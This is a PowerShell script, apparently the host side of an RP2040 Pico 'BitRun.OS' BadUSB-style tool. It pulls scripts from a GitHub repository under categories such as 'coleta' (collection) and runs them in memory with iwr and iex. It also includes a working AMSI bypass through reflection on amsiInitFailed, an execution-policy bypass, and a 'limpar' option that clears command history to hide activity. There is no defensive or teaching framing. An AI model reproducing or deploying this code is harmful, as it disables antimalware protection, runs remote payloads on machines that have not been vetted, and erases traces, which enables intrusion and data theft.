$user = "arthurboby"
$repo = "Pico-Tools"
$urlApi = "https://github.com"

# Função para falar com a tela do RP2040
function Log-Pico($texto, $porcentagem) {
    try {
        $portName = (Get-PnpDevice -FriendlyName "*USB Serial Port*" -Status OK).Caption -replace ".*\(|\)"
        $port = New-Object System.IO.Ports.SerialPort $portName, 9600, None, 8, one
        $port.Open()
        $port.WriteLine("$($texto):$($porcentagem)")
        $port.Close()
    } catch {}
}

function Mostrar-Menu-Dinamico($caminho) {
    Log-Pico "Lendo Pasta" 30
    $arquivos = Invoke-RestMethod -Uri "$urlApi/$caminho"
    $lista = $arquivos | Where-Object { $_.type -eq "file" }
    
    Clear-Host
    Write-Host "=== BitRun.OS // $caminho ===" -ForegroundColor Cyan
    for ($i=0; $i -lt $lista.Count; $i++) { Write-Host "($($i+1)) $($lista[$i].name)" }
    
    $opc = Read-Host "`nEscolha uma opção (0 para voltar)"
    if ($opc -eq "0") { return }

    $escolhido = $lista[[int]$opc - 1]
    Log-Pico "Baixando..." 60
    
    $conteudo = iwr -useb $escolhido.download_url
    Log-Pico "Executando" 90
    
    if ($escolhido.name.EndsWith(".ps1")) {
        iex $conteudo
    } else {
        $destino = "$home\Desktop\$($escolhido.name)"
        iwr -useb $escolhido.download_url -OutFile $destino
    }
    Log-Pico "Concluido" 100
    pause
}

# Menu Principal
$cat = $args[0]
switch ($cat) {
    "pessoal" { Mostrar-Menu-Dinamico "pessoal" }
    "escola"  { Mostrar-Menu-Dinamico "escola" }
    "coleta"  { Mostrar-Menu-Dinamico "coleta" }
    "limpar"  { 
        Log-Pico "Limpando..." 50
        Clear-History
        Log-Pico "Adeus" 100
        exit 
    }
    "bypass"  {
        Log-Pico "Bypassing..." 20
        # AMSI Bypass
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Log-Pico "AMSI OK" 60
        Set-ExecutionPolicy Bypass -Scope Process -Force
        Log-Pico "Pronto" 100
        pause
    }
}
